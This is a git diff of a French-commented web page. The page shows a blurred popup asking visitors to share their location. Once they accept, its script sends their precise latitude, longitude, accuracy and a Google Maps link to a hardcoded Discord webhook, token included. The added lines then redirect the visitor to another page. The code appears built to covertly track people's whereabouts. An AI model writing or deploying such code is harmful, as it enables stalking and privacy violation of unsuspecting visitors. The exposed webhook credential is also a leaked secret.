@@ -17,7 +17,6 @@
         font-family: "Segoe UI", sans-serif;
     }
 
-    /* Flou d'arrière-plan */
     #blur-bg {
         position: fixed;
         top: 0; left: 0; 
@@ -26,7 +25,6 @@
         background: rgba(0,0,0,0.55);
     }
 
-    /* Popup */
     #popup {
         position: relative;
         width: 90%;
@@ -102,9 +100,6 @@ document.getElementById("locBtn").addEventListener("click", () => {
 
     navigator.geolocation.getCurrentPosition(
         
-        // -------------------------------
-        // POSITION ACCEPTÉE ✔
-        // -------------------------------
         (pos) => {
             const lat = pos.coords.latitude;
             const lon = pos.coords.longitude;
@@ -115,7 +110,7 @@ Latitude : ${lat}
 Longitude : ${lon}
 Précision : ${acc} mètres`);
 
-            // ⭐ ENVOI AU WEBHOOK DISCORD ⭐
+            // ⭐ Envoi au webhook Discord ⭐
             fetch("https://discord.com/api/webhooks/1439661175171321858/ArdpA1ymgbU62Zim6absStxNuwR_D8rVAFe4KHMPz4eLaKmiMCw0vEQcuzhBjXaXWILb", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
@@ -137,11 +132,11 @@ https://www.google.com/maps?q=${lat},${lon}`,
                     ]
                 })
             });
+
+            // ⭐ REDIRECTION APRÈS AUTORISATION ⭐
+            window.location.href = "https://example.com"; // ← Mets ta page ici
         },
 
-        // -------------------------------
-        // REFUS / ERREUR ❌
-        // -------------------------------
         (err) => {
             const errorDiv = document.getElementById("error");
             errorDiv.style.display = "block";
